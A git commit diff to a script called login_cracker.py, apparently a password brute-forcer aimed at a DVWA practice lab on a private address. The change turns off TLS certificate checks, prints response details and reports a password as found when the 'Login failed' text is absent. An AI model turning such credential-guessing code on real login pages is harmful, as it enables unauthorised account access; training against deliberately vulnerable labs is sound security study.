9d09904a8700fe77c5e9b24777d85b84acf47f0f
Andrea Dybendal <anddyb671@gmail.com>
2023-05-30 05:26:30 -0500

    Added code to check login

--- login_cracker.py
+++ login_cracker.py
@@ -37,13 +37,20 @@ try:
         password = password.strip("\n")
 
     data = {'username':username, 'password':password, "Login":'submit'}
-    send_data_url = requests.post(url, data=data)
+    send_data_url = requests.post(url, data=data, verify=False)
+    print(send_data_url.headers)
+    print(send_data_url.status_code)
+    print(send_data_url.content)
+    print(send_data_url.url)
 
     if "Login failed" in str(send_data_url.content):
         cprint("[*] Attempting password: %s" % password, 'red')
     else:
         cprint("[*] Password found: %s " % password,'green')
         cprint(requests.get(url = 'http://192.168.142.138/dvwa/index.php').text, 'blue')
+
+        
+        
 
 except:
     cprint("There was an error, please try again..", 'red')
